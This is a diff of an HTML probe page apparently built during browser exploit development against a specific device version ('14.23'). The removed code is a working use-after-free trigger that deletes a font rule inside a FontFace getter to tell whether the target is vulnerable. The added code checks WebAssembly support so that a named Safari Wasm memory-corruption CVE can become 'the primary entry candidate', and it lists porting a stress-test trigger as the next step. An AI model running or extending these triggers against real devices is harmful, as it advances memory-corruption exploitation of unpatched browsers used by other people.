@@ -2,79 +2,48 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>P2 v18</title>
+<title>P3 v19</title>
 <style>body{font-size:28px;font-family:sans-serif;background:#111;color:#0f0}pre{white-space:pre-wrap;font-size:22px}</style>
-<style id="s0">@font-face { font-family: x; src: local(Helvetica); unicode-range: U+0042; }</style>
 </head>
 <body>
-<h3 id="st">stage A</h3>
+<h3 id="st">wasm probe</h3>
 <pre id="out"></pre>
 <script>
-// Phase 2 v17: THE DISCRIMINATOR. The rule face is now LOADABLE (local font).
-// After the getter deletes the rule mid-load:
-//   resolve  -> the Ref<> fix held the face alive -> PATCHED on 14.23
-//   hang/crash -> the face was freed mid-flight    -> VULNERABLE (UAF live)
-// Previous hang was innocent: nonexistent-font.woff could never complete.
+// v19: WebAssembly availability on 14.23. If Wasm works, CVE-2026-113903
+// (tail-call + memory.grow stale-base write, fixed Safari 27.2 = after the
+// 14.23 cutoff) becomes the primary entry candidate with a known trigger.
 function log(s) { document.getElementById('out').textContent += s + "\n"; }
 
-log('PAGE VERSION: v18 (proven-font discriminator)');
+log('PAGE VERSION: v19 (WebAssembly probe)');
 log('UA = ' + navigator.userAgent);
+log('typeof WebAssembly = ' + typeof WebAssembly);
 
-function control() {
-  // CONTROL (no trigger): the same load WITHOUT any deletion must resolve.
-  var B = new FontFace('c', 'local(Helvetica)', { unicodeRange: 'U+0041' });
-  document.fonts.add(B);
-  void B.loaded;
-  document.fonts.load('1em c', 'AB').then(
-    function (f) { log('CONTROL load resolved: ' + (f ? f.length : '?') + ' faces - good'); },
-    function (e) { log('CONTROL load rejected: ' + e + ' - local fonts unavailable, test invalid'); });
+if (typeof WebAssembly === 'undefined') {
+  log('NO WebAssembly - CVE-2026-113903 unreachable, stays 14.10-like');
+} else {
+  // minimal module: (module (func (export "f") (result i32) i32.const 42))
+  var bytes = new Uint8Array([
+    0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
+    0x01, 0x05, 0x01, 0x60, 0x00, 0x01, 0x7f,
+    0x03, 0x02, 0x01, 0x00,
+    0x07, 0x05, 0x01, 0x01, 0x66, 0x00, 0x00,
+    0x0a, 0x06, 0x01, 0x04, 0x00, 0x41, 0x2a, 0x0b
+  ]);
+  WebAssembly.instantiate(bytes).then(function (r) {
+    var v = r.instance.exports.f();
+    log('instantiated OK, f() = ' + v + (v === 42 ? ' (correct)' : ' (WRONG)'));
+    log('=> WASM AVAILABLE on 14.23 - CVE-2026-113903 is the primary candidate');
+    log('   next: port JSTests/wasm/stress/tail-call-same-instance-js-import-memory-grow.js');
+  }, function (e) {
+    log('instantiate FAILED: ' + e);
+    log('=> Wasm present but broken/limited - inspect error');
+  });
 }
 
-function trigger() {
-  log('stage B: trigger in 3s');
-  setTimeout(function () {
-    log('triggering (loadable rule face)');
-
-    var A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
-    document.fonts.add(A);
-    void A.loaded;
-
-    var fired = 0;
-    Object.defineProperty(FontFace.prototype, 'then', {
-      configurable: true,
-      get: function () {
-        fired++;
-        if (this === A && fired === 1) {
-          log('GETTER FIRED - deleting rule now');
-          try { document.getElementById('s0').sheet.deleteRule(0); } catch (e) {}
-          document.body.offsetTop;
-        }
-        return undefined;
-      }
-    });
-
-    try {
-      document.fonts.load('1em x', 'AB').then(
-        function (f) {
-          log('load RESOLVED with ' + (f ? f.length : '?') + ' faces');
-          log('=> FACE SURVIVED THE DELETE = Ref<> fix present = PATCHED');
-        },
-        function (e) {
-          log('load rejected: ' + e);
-          log('=> face failed after delete - ambiguous, examine error');
-        });
-    } catch (e) { log('load threw: ' + e); }
-
-    setTimeout(function () {
-      log('no resolve after 5s => promise hung on the deleted face');
-      log('=> face could NOT complete after free = VULNERABLE (or rule-removal starves U+0042)');
-    }, 5000);
-  }, 3000);
-}
-
-log('armed - control first, then trigger');
-control();
-window.onload = trigger;
+log('typeof WebAssembly.Memory = ' + (typeof WebAssembly !== 'undefined' ? typeof WebAssembly.Memory : 'n/a'));
+try { log('new WebAssembly.Memory({initial:1}).buffer.byteLength = ' +
+    (typeof WebAssembly !== 'undefined' ? new WebAssembly.Memory({initial:1}).buffer.byteLength : 'n/a')); }
+catch (e) { log('Memory FAILED: ' + e); }
 </script>
 </body>
 </html>
